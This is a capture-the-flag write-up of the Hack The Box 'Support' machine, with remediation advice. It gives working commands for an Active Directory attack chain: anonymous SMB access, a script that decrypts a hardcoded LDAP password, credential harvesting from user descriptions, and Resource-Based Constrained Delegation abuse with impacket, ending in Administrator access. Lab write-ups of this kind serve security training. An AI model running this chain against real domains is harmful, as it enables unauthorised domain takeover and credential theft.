# HTB - Support

## Summary

**Support** is an easy-rated Active Directory machine that demonstrates a realistic attack chain starting from anonymous SMB access. The initial foothold comes 
from discovering an internal support tool stored on a publicly accessible share. By reverse-engineering the application, it is possible to recover hardcoded 
LDAP credentials, enumerate the domain, obtain a second set of credentials from Active Directory descriptions, and ultimately compromise the domain controller 
by abusing misconfigured ACLs and Resource-Based Constrained Delegation (RBCD).

---

# Attack Path

## 1. Initial Enumeration

Scanning the target reveals that it is an Active Directory Domain Controller.

```bash
nmap -sC -sV 10.129.39.77
```

### Open Ports

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Interesting findings:

- Domain: `support.htb`
- Hostname: `DC`
- WinRM enabled
- SMB signing enabled

---

## 2. Anonymous SMB Enumeration

Anonymous access reveals a share called `support-tools`.

```bash
smbclient //10.129.39.77/support-tools -N
```

Download the archive:

```bash
mget UserInfo.exe.zip
```

---

## 3. Reverse Engineering the Internal Tool

Extract the archive:

```bash
unzip UserInfo.exe.zip
```

Decompile the executable:

```bash
mkdir userinfo

~/.dotnet/tools/ilspycmd UserInfo.exe -o userinfo
```

Search for sensitive information:

```bash
grep -RiE \
"password|secret|token|key|ldap|sql|domain|user|username|samaccount|group|http|https|\\\\|cmd|powershell" \
userinfo/
```

Interesting code:

```csharp
private static string enc_password =
"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

private static byte[] key =
Encoding.ASCII.GetBytes("armando");
```

The application authenticates using:

```csharp
entry = new DirectoryEntry(
    "LDAP://support.htb",
    "support\\ldap",
    password
);
```

---

## 4. Recovering LDAP Credentials

The password is obfuscated using a simple XOR routine.

### crack.py

```python
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

cipher = base64.b64decode(enc)

plain = bytearray()

for i, b in enumerate(cipher):
    plain.append((b ^ key[i % len(key)]) ^ 0xDF)

print(plain.decode())
```

Recovered credentials:

```text
Username: support\ldap
Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## 5. LDAP Enumeration

Enumerate users and descriptions:

```bash
ldapsearch \
-x \
-H ldap://10.129.39.77 \
-D 'support\ldap' \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b 'DC=support,DC=htb' \
'(objectClass=user)' \
description info
```

Interesting finding:

```text
User: support

Password:
Ironside47pleasure40Watchful
```

---

## 6. Initial Foothold via WinRM

Authenticate as `support`:

```bash
evil-winrm \
-i 10.129.39.77 \
-u support \
-p 'Ironside47pleasure40Watchful'
```

Retrieve the user flag:

```powershell
type C:\Users\support\Desktop\user.txt
```

---

## 7. BloodHound Enumeration

Collect domain data:

```bash
bloodhound-python \
-u support \
-p 'Ironside47pleasure40Watchful' \
-d support.htb \
-dc support.htb \
-ns 10.129.39.77 \
-c All
```

BloodHound reveals the following attack path:

```text
support
    ↓ MemberOf

SHARED SUPPORT ACCOUNTS
    ↓ GenericAll

DC.support.htb
```

The compromised user inherits `GenericAll` over the domain controller computer object.

---

## 8. Checking MachineAccountQuota

Verify whether users can create machine accounts:

```bash
netexec ldap \
10.129.39.77 \
-u support \
-p 'Ironside47pleasure40Watchful' \
-M maq
```

Output:

```text
MachineAccountQuota: 10
```

Machine account creation is allowed.

---

## 9. Resource-Based Constrained Delegation (RBCD)

### Create a Machine Account

```bash
impacket-addcomputer \
-computer-name 'MYNEWPC$' \
-computer-pass 'Password123!' \
-dc-ip 10.129.39.77 \
'support.htb/support:Ironside47pleasure40Watchful'
```

---

### Configure Delegation

```bash
python3 /opt/impacket/examples/rbcd.py \
-action write \
-delegate-from 'MYNEWPC$' \
-delegate-to 'DC$' \
-dc-ip 10.129.39.77 \
support.htb/support:'Ironside47pleasure40Watchful'
```

---

### Request an Administrator Ticket

```bash
python3 /opt/impacket/examples/getST.py \
-spn cifs/DC.support.htb \
-impersonate Administrator \
support.htb/MYNEWPC$:'Password123!'
```

Export the ticket:

```bash
export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

---

## 10. Privilege Escalation

Authenticate as Administrator using Kerberos:

```bash
python3 /opt/impacket/examples/wmiexec.py \
-k \
-no-pass \
-dc-ip 10.129.39.77 \
support.htb/Administrator@DC.support.htb
```

Retrieve the root flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

# Key Learnings

- Internal tools stored on SMB shares may contain sensitive information.
- .NET applications can be easily decompiled using tools such as ILSpy or dnSpy.
- Obfuscation is not encryption.
- Custom encryption routines embedded in applications can often be reversed.
- LDAP service accounts are valuable for Active Directory enumeration.
- Active Directory user descriptions should never contain credentials.
- BloodHound is extremely useful for visualizing ACL-based privilege escalation paths.
- Misconfigured ACLs can lead to complete domain compromise.
- Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation technique.
- `MachineAccountQuota` can increase the impact of ACL misconfigurations.

---

# Remediation

## Secure SMB Shares

- Remove anonymous access.
- Restrict access to internal tools.
- Apply the principle of least privilege.

## Protect Secrets

- Never hardcode credentials in applications.
- Use secure secret-management solutions.
- Avoid custom encryption mechanisms.

## Harden Active Directory

- Audit user descriptions and remove sensitive information.
- Review delegated permissions regularly.
- Avoid granting `GenericAll`, `GenericWrite`, or `WriteDACL` over critical objects.

## Mitigate RBCD Abuse

Disable unnecessary machine account creation:

```powershell
Set-ADDomain -Identity support.htb -Replace @{'ms-DS-MachineAccountQuota'=0}
```

Monitor:

- Machine account creation.
- Changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Delegation-related attributes.
- Suspicious LDAP enumeration.
- Unusual Kerberos ticket requests.

---

# Final Thoughts

Although **Support** is an easy machine, it introduces several practical concepts commonly encountered in real-world environments, including reverse engineering internal tooling, credential recovery, LDAP enumeration, ACL abuse, and Resource-Based Constrained Delegation.

The most interesting part of the machine was the discovery of the internal .NET application and the extraction of credentials from its source code, demonstrating how seemingly harmless files can ultimately lead to full domain compromise.
